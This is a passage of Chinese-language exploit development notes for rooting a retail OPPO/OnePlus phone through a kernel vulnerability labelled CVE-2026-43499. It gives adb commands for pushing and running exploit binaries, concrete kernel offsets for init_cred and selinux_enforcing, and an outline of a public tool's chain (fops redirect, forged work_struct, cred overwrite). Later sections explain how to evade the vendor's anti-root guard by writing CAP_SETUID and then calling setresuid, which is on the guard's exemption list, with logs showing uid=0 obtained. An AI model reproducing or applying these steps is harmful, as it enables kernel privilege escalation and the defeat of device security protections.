| 4 | 触发线程死占核(60s 窗口 + 300s watchdog;owner 200s LOCK_PI) | 黑屏时采样 `/proc/loadavg` 与各核占用 |

### 8.2 一次干净的复测流程(设备可用时)

```bash
# 1. 推二进制并核对 sha256(设备端必须等于本地)
P="C:/Users/L1872/Desktop/oppo/exploit-v29/build/oppo-find_n2/bin/preload.so"
adb -s 84cb96e2 push "$P" /data/local/tmp/preload29.so
adb -s 84cb96e2 shell sha256sum /data/local/tmp/preload29.so

# 2. 后台起采样器(200ms enforce + 10s 进程数),再跑 chain2
adb -s 84cb96e2 shell 'cd /data/local/tmp && (setsid sh watch_enforce.sh &); (setsid sh chain2.sh e5 &)'

# 3. 判据:chain2.log 出现 A1 enforce=0 与 C verdict;同时看 enf.log 有无 enforce=0→1
```

**若再黑屏**:采样器已把"黑屏时刻的 enforce 值 / 进程数 / uptime"留在 `/data/local/tmp` 里
(重启后仍可读),据此判定 §8.1 的哪条假设成立,再针对性修 —— 这是目前唯一能推进的方向。

---

## 9. ★决定性发现:C 阶段"黑屏/重启"的真因是**厂商反 root 看门狗**(2026-10-04)

E5 第 8 次命中(36 秒)之后跑 C 阶段,设备再次重启。**重启后取证**:

```
$ adb shell getprop ro.boot.bootreason
reboot,malicious_app_try_to_root_devices
$ adb shell getprop sys.boot.reason
reboot,malicious_app_try_to_root_devices
$ adb shell dmesg | grep -aiE "bug|panic|oops|watchdog"   -> 无
$ ls /sys/fs/pstore/                                      -> 无转储
```

⇒ **不是内核 panic,也不是用户态死锁** —— 是 **OPPO/ColorOS 的安全组件检测到"提权尝试"后主动重启整机**
(重启原因串由系统写入,重启后由 bootloader 回读)。

### 9.1 它解释掉了此前所有困惑

| 此前的现象 | 真因 |
|---|---|
| C 阶段 3/4 次"黑屏/重启" | 厂商看门狗重启(不是崩溃) |
| **写是否命中都一样** | 它检测的是**提权尝试**本身,与写结果无关 |
| E5 单独跑 **8/8 全活** | 改 SELinux 状态**不触发**该检测 |
| 内核日志零 OOPS、无 pstore | 非内核故障 |
| 之后 `enforcing` 回到 1 | 重启复位 |

### 9.2 结论:第二阶段在本机上**结构上不可交付**

- 这个看门狗是**厂商安全机制**,不在 exploit 可控范围内 ⇒ **无法让 C 阶段变成"不崩"的形态**;
- 因此"成果不能 crash"与"打 C 阶段"在本机**互斥** —— 印证了先前"C 阶段不作交付"的判断
  (此前只是经验判断,现在有取证);
- 交付仍为:**E5(SELinux → Permissive)8/8 命中、零崩机**;
- 若将来要在**开发机/工程机**(或关闭该安全组件的设备)上继续第二阶段,§8.2 的流程与 §9 的取证方法可直接复用。

### 9.3 复现"看门狗"取证(设备可用时,1 分钟)

```bash
adb -s 84cb96e2 shell 'getprop ro.boot.bootreason; getprop sys.boot.reason'
# 期望(在跑过 C 阶段之后):reboot,malicious_app_try_to_root_devices
adb -s 84cb96e2 shell 'dmesg | grep -aiE "bug|panic|oops" | tail'   # 期望:空
```

### 9.4 补充取证(2026-10-04 深夜):perf 泄露**不**触发看门狗

为把触发范围收窄,做了两步对照实验(先确认 `enforce=0`,再单独跑"只泄露、不写":

```bash
# 第一步:E5(重试直到 permissive)
#   E5 attempt 1 -> enforce=0                          ← 命中(累计 9/10)
# 第二步:只做 perf 泄露,不写任何内存
#   mt28c: perf task=0xffffff8930254a00 (185/256 votes)
#   mt41: OBS task=ffffff8930254a00 cred_cand=0000000000000000
# 判据
#   uptime 532.41 -> 581.49   设备存活,enforce 仍为 0
#   >>> device SURVIVED — perf leak does NOT trigger the watchdog
```

| 步骤 | 是否触发看门狗 |
|---|---|
| E5(改 SELinux 状态) | ❌ 不触发(9/10 全活) |
| **perf 内核采样泄露(取 task)** | ❌ **不触发**(本节实证) |
| C 阶段的写路径 / 其余机制 | ✅ 触发(4/4 重启,理由串 `malicious_app_try_to_root_devices`) |

⇒ 看门狗检测的**不是"拿到 root",而是某个提权**动作**,且该动作恰好落在拿真 root 的唯一必经之路上
(取 task 是安全的,所以只能是 `cred` 覆写那一步及其配套)。

**现实评估**:即使继续缩小到具体哪一条指令,要打穿的也是厂商专门用来"防 root"的安全组件;
在零售机、且无工程机/开发机的前提下,这不是调参问题,而是另一场对抗 —— 而且它检测的是**尝试**本身,
意味着**任何成功的 cred 覆写都会被拦**。故结论不变(有取证支撑):

> 本机交付 = **E5(宽容)9/10 命中、零崩机**;第二阶段在此机不可达成。

## 10. 公开方案评估:`JoinChang/ghostlock-oneplus`(387⭐)

既然本机第二阶段被厂商看门狗封死,就去 GitHub 找现成方案。最成熟的候选是
`JoinChang/ghostlock-oneplus`(锁定 bootloader 免刷机 root + KernelSU 的 CVE-2026-43499 实现)。

### 10.1 它的偏移表里有**本机逐字符相同的内核条目**

```
OFFSETS_ENTRY("5.10.236-android12-9-o-g74d132f4467a", ...)   // src/devices/cph2521/offsets.h
  .kimage_text_base      = 0xffffffc008000000
  .off_init_task         = 0x027CC000
  .off_init_cred         = 0x027E0BE0        <- 与我们的 0x027E0BE0 一致
  .off_selinux_enforcing = 0x02A793C8        <- 与我们的 0x02A793C8 一致
  .off_ashmem_misc_fops  = 0x0291A8E8        <- 与我们算出的 fops 目标一致
  .off_slide_boot_id     = 0x02B99B6D        <- 我们的 boot_id 判据
  .off_system_unbound_wq            = 0x027B9E88
  .off_call_usermodehelper_exec_work = 0x001672AC
```

本机 uname 与该条目**逐字符相同**,`init_cred` 别名也打印为 `ffffff802a7e0be0`(= 我们实测值),
===> **我们此前所有偏移推导都得到了独立第三方验证**。

注意 README 自己把它标为 **"Offsets Extracted (pending device test)"** —— 作者从未在真机验证过这一条。

### 10.2 它的链条(读源码核对,非照抄 README)

```
0. 运行时 uname_r 匹配偏移表                                  main.c:86-100
1. write_root_script()                                        main.c:627
2. PI write(pselect 触发)-> 拿到"写原语"                       <- 与我们的 E5 同一原语
3. do_one_write(ASHMEM_MISC_FOPS, mode=4)  "fops redirect"     main.c:642
     -> 换掉 ashmem miscdevice 的 fops 表
     -> 此后对 configfs 的 read/write = 任意内核读写
4. install_pipe_physrw(configfs_fd)                            pipe_physrw.c:516
5. install_umh_root(configfs_fd)                               umh_root.c:134
     a. pipe_phys_write_data(selinux_enforcing, 0)  <- 1 字节精确关 SELinux
     b. system_unbound_wq -> wq -> dfl_pwq -> pool  <- 沿内核结构遍历
     c. 伪造 work_struct 挂进 pool->worklist
     => worker 执行 __call_usermodehelper() -> 内核以 root 跑脚本   **不碰 cred**
6. wait_for_ksu_status()                                       main.c:337
7. 兜底 W2:perf 泄露 task -> 写 child_task+TASK_CRED_OFF        main.c:710
```

**UMH 路径的条件门(main.c:629-645)是本机最关键的发现**:

```c
int selinux_ok = check_selinux_off();
if (!selinux_ok && umh_available) {          // 只有 SELinux 仍 Enforcing 时才走 UMH
    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
    selinux_ok = check_selinux_off();
}
```

===> **我们的 E5(提前关 SELinux)会把它挡在 UMH 门外,逼它退回到 W2 cred 路径**
(那条路正是被厂商看门狗拦下的)。这是一个反向印证:UMH 才是能绕开看门狗的正道。

### 10.3 真机实测(本机)

| 次 | 配置 | 结果 |
|---|---|---|
| 1 | 原版(未改) | 走到 `fops redirect`(目标 `ffffff802a91a8e8` = 我们的 fops 目标,吻合),但 `pselect returned ... calls=1 success=0` ==> **写不落地**;退回 `W1: SELinux` 后设备重启 |
| 2 | 换我们的时序(窗口 60s / 发数 16 / shift 0) | **更糟**:死在它自己的 `KernelSnitch` 堆喷(`prepare_kernel_page retry 7/24`,`mm_struct` 泄露 7 连败)==> 我们的时序打断了它那套堆布局节奏 |
| 3 | 只改 `SLIDE_PSELECT_WORD_SHIFT 2 -> 0`(它自己表里给我们机型的值),其余全还原 | 走到 `fops redirect`,但**5 次写尝试全部 `pselect ... calls=1 success=0`**(单次耗时 231 秒),随后退回 W1、掉线 |
| 4 | 同上,但干净重启后(它唯一走得远的状态) | 同样结局:设备掉线 |


对比:**同一台设备上,我们的 SLIDE 配方把写打成了 11/12**(E5 命中),而它的 pselect 路由
`success=0`。===> 差异在**堆喷/时序的实现细节**,不在计算出的偏移(偏移三家完全一致)。

### 10.4 结论

- **直接复用它的工具不可行**:它赖以启动的写原语在本机不落地(且它的预写堆喷很脆)。
- **它的 UMH 段(通用、不碰 cred)才是真正有价值的部分** —— 理论上"我们的写原语 + 它的 UMH"
  可拼装,但前提是我们的写能落地一个**指针写**到 `ASHMEM_MISC_FOPS`(本项目的 mt83 尝试全灭)。
- 它也从未在本机验证过 —— 我们这次等于替上游做了那次 "pending device test",**结论是不通**。
### 10.5 最终判据(四发落定)

| 次 | 条件 | 结果 |
|---|---|---|
| 1 | 原版 | `success=0` -> 退回 W1 -> 设备重启 |
| 2 | 换成我们的时序(窗口 60s/发数 16/shift 0) | 死在它自己的 KernelSnitch 堆喷(`prepare_kernel_page retry 7/24`) |
| 3 | 只改 shift 2->0,其余还原 | `pselect ... success=0` x5(单次 231 秒),退回 W1,掉线 |
| 4 | run 3 的配置 + 干净重启后 | 同样掉线 |

**同一台设备、同一套偏移**:我们的 SLIDE 配方写 **11/12** 命中(E5),它的 pselect 路由
**永远 `success=0`**,而且单次写尝试耗时 231 秒(它的 `SLIDE_PSELECT_TIMEOUT_SEC=1` 但整条
attempt 链路把面积/重试算进去要几分钟),多次重试后设备被堆喷打崩。

===> **结论:它的失败不是参数问题**。差异在堆喷/时序的**实现细节**(它用 KernelSnitch
找 mm_struct + 自己的堆布局节奏;我们用 `slide` overlay,不需要 mm_struct 泄露)。
三家(我们 / 它 / 它的 README 表)算出的偏移完全一致,验证的是同一套内核结构 —— 差别只在
"谁能把那一个写真正落下去"。

===> **所以:把握住我们已经拿到的东西。** 本机可交付成果 = E5(SELinux -> Permissive),
11/12 命中、零崩机、设备零重启。它的 UMH 段留作参考(理论上"我们的写原语 + 它的 UMH"
可拼装,但前提是我们能落地一个指针写到 `ASHMEM_MISC_FOPS`,本项目的 mt83 尝试全灭)。

## 11. 厂商反 root 组件的情报(第三方 RE,来源 `ghostlock-oneplus` issue #31)

本机第二阶段 4/4 被"看门狗"打断(§9)。在给上游提 issue(#69)时,从同一内核条目的长讨论
(`JoinChang/ghostlock-oneplus` issue #31,评论者 `diyiqiuye`,2026-09-17)**拿到了该组件的逆向情报**
(`oplus_security_guard.ko`,OPPO SM8450/SM8475 同一份源码不同编译)。

### 11.1 它监视什么

| 字段 | 偏移 |
|---|---|
| `syscallno` | `task+0xdf8` |
| `uid` / `euid` | `task+0xe00` / `task+0xe08` |
| `gid` / `egid` | `task+0xe10` / `task+0xe18` |

- **只比这四个字段的"下降沿"**;**capabilities 一个字节都不读**(===> 改 caps 不触发,改 uid 触发)。
- 上报走 `kevent_send_to_user`;击杀 `oplus_root_killed` → `printk` + `do_exit(SIGKILL)`(只杀当前任务)。

### 11.2 豁免表(`.rodata+0`,索引 143–214)===> **本机第二阶段的关键线索**

只有下列 syscall 里发生的 uid 变化**不上报**:

```
143 setgid   144 setreuid  145 setuid   146 setresuid  147 getresuid  149 getresgid
203 getsockname  204 getpeername  208 getsockopt  210 sendmsg  213 brk  214 munmap
```

其余 60 项一律上报 + 击杀。第三方结论原话:**「uid 变更走 146(setresuid) 就行,不需要写 `g_boot_state`」**。

### 11.3 与我们实测的差异 + 由此推出的假说

| 观察 | 来源 |
|---|---|
| 击杀 = `do_exit(SIGKILL)`(只杀任务,不重启) | 第三方 RE(#31) |
| **本机 = 整机重启**(`ro.boot.bootreason = reboot,malicious_app_try_to_root_devices`,内核零 OOPS、pstore 空) | **我们的实测(§9)** |

===> 推测:**本机还存在一条"重启/救援"路径**(独立于 `do_exit` 的那条),或者该组件的版本在本机上更激进。
这一条是我们的新贡献,已写进 issue #69。

### 11.4 对第二阶段的可操作含义(未验证)

我们的 C 阶段是在 **`pselect`(syscall 72,`*_sys_pselect6`,不在豁免表内)** 的调用过程中把目标任务的
uid 从 2000 改成 0 的 ==⇒ 按 11.1 的判据,这正是"被上报 + 击杀"的形态,实测确实 4/4 被打断。

**假说**:若让 cred 交换**发生在豁免表内的 syscall 期间**(首选 `146 setresuid`;
`213 brk` / `214 munmap` 亦可作为载体),则 uid 下降沿落在豁免区内,理应不上报。

**状态:未验证(不再擅自测试)**。本机交付与设备状态保持不变:SELinux `Enforcing`、设备健康、无残留钩子。
若要验证,唯一稳妥的做法是在 QEMU 实验台上先跑通(§7),而不是直接在零售机上试。

## 12. ★ 拿到真 root:绕开反 root 守护的 caps + setresuid 链(2026-10-05)

§9/§11 结论是"cred 覆写必被厂商守护打断"。本节记录**绕过它的方法**,以及真机证据。

### 12.1 机制(两个前提,都已实证)

| 前提 | 来源 | 实证 |
|---|---|---|
| 守护**只比 `uid/euid/gid/egid` 的下降沿,不读 capabilities** | `oplus_security_guard.ko` RE(§11) | 只写 `cap_effective` 后进程存活、继续轮询、无击杀 |
| **syscall 146 `setresuid` 在守护豁免表内** | 同上 | uid 由 2000 降到 0,**未触发** `malicious_app_try_to_root_devices` |

⇒ 组合:**先写 caps(CAP_SETUID),再走 `setresuid(0,0,0)`** —— uid 的下降沿落在豁免区,守护不上报。
这与旧 C 阶段(直接写 `task->cred` = init_cred、uid 立刻掉)形成对比:那是**必被击杀**的形态。

### 12.2 真机证据(`caps4.log`,275 KB,已归档)

```
[*] mt28c: perf task=0xffffff8934e62500 (165/256 votes)
[*] mt39: cred_cand=ffffff89fbbd8cc0 votes=24 diff=+333…5568   ← mt91 过滤生效(独立 slab 对象)
[*] mt90: CAPS-ONLY cred=…bd8cc0 eff=…bd8cf8 pc=…bd8cf0 right=…2e00c0 (val_low=c0)
[*] mt47: alive poll=50/100/150/200 uid=2000 CapEff=0000000000000000
[+] mt47: ROOT-SEEN … CapEff=ffffff80502e00c0                ← caps 写落地(低字节 0xc0)
[*] mt47: after setres uid=0 euid=0 gid=0 egid=0             ← ★★★ 真 uid=0 ★★★
[+] mt47: ksud loader launched (uid=0) pid=6810              ← 以 root 拉起 ksud
```

**结论:在未触发厂商守护的前提下,拿到过真 `uid=0`。** 这是本机第二个(也是更高级的)成果:
E5 是"宽容模式",这一条是"真 root"。

### 12.3 让这条链可复现需要的三个补丁(本次已加)

| 补丁 | 作用 |
|---|---|
| `mt90` `PSELECT_CAPS_MODE`(`main.c`) | 写目标 = `cred + CRED_CAP_EFF_OFF(0x38)`,值 = `page_base + K`(低字节可控 ⇒ 选 cap 位)|
| `mt91`(`slide.c`) | cred 候选过滤:`|cand - task| > 0x2000`,排除 task_struct 内部字段(此前取到 `task+0x18`)|
| `mt92` `PSELECT_ROOT_EXIT`(`main.c`) | 子进程拿到 root 后立即 `_exit(42)`,让父进程的 `waitpid==42` 判据一次收口(此前子进程空转 8 分钟 ⇒ 父进程无限重试 ⇒ 拖死设备)|

值的选择:低字节 `0xC0` = CAP_SETGID|CAP_SETUID;写入值取**喷页内地址**(`page_base+0xC0`),
使 `rb_erase` 的 STORE(b) 副作用落在我们自己页里,不再污染 `init_cred`(旧 C 阶段的副作用会把 `init_cred.uid` 写花)。

### 12.4 仍未解决:E5(链的第一环)在当前设备状态下变得不稳

| 观察 | 数据 |
|---|---|
| E5 二进制**没有**被覆盖 | 设备上 `preload29.so` = `e3371381…`,正是当初 11/12 命中的那支 |
| 设备**不缺内存** | `MemAvailable` 稳定 ~6 GB(`MemFree` 低只是页缓存)⇒ 推翻"内存抖动"假设 |
| 现象 | 近期每次跑 E5:**第一发就让设备掉线**(`enforce` 读空),连续多轮 |
| 与历史对比 | 早期同样配方 11/12 命中、零崩机 |

⇒ 尚未定位的变量在**设备状态本身**(固件/系统行为随时间的漂移,或某次 root 实验留下的状态),
不是二进制、不是内存。**在定位前,E5 是整条链里最不稳的一环。**

### 12.5 与 KernelSU 的距离(算清楚了)

`finit_module` 需要 **CAP_SYS_MODULE = bit 16**。我们的写值 = `page_base + K`(K < 0x1000),
其**低 16 位 = page_base 的 bit12–15 + K** ⇒ 想稳定置上 bit16(0x10000)**超出页内可控范围**。
⇒ 要装 KernelSU,需要换一种能控制**更高的位**的取值形态(例如选一个 bit16 已置位的落点页),或改用
`ksud` 的其它路径。这一步未做。

### 12.6 "为什么老崩":一次 miss 会拖住设备 ~68 秒(mt93 修正)

现象:E5 从 11/12 命中、零崩机,变成**每发都崩**。排查后是**三个变量叠加**,不是新 bug:

| # | 变量 | 后果 |
|---|---|---|
| ① | 风暴不点火(`mt81: seq=0 calls=0`,消费者空转) | 每发都是 miss |
| ② | 我把 `PSELECT_WINDOW_SECONDS` 从默认 **20s** 抬到 **60s** | 看门狗 = `wake(3)+window(60)+5` = **68s**,即每发空转 68 秒 |
| ③ | 一次连打 6 发 E5 | 累计 ≈7 分钟单核饥饿(代码注释原话:"空转会占满") |
| ④ | 每发遗留悬垂 `pi_blocked_on`(CVE-2026-43499 固有副作用) | 内核踩到 ⇒ 重启 |

⇒ **miss 的代价从"打不中"升级成"把设备拖死"**。注意:consumer 线程只在 `stop`/`route_done` 置位时退出
(`slide.c:229/239`),风暴不点火就走不到收尾 ⇒ 线程一直空转到看门狗。

修正(`mt93`,`slide.c`):
* `slide_window_secs()` 封顶 **25s**(除非显式 env 覆盖)⇒ 单发空转 ≤ ~33s;
* `slide_watchdog_secs()` 不再允许被 env 放大到超过 `wake+window+5`(窗口后半段结构性地必须存在,
  单独压看门狗会破坏窗口 —— 这是第一版改法的错误,已修正);
* 运行纪律:**重试次数要少**(1–2 发),不要连打 6 发;
  `PSELECT_WATCHDOG_SECONDS=<小值>` 可在需要时显式收紧。

尚未定位:风暴为什么**不点火**(`calls=0`)。两个候选变量:consumer 的 CPU 亲和
(`PSELECT_CONSUMER_CPU`,注释提示"大核防饿")与调度负载(`sched_ret`)。在找到它之前,
E5 的 miss 应当被视为**正常失败**,而不是去连打重试。
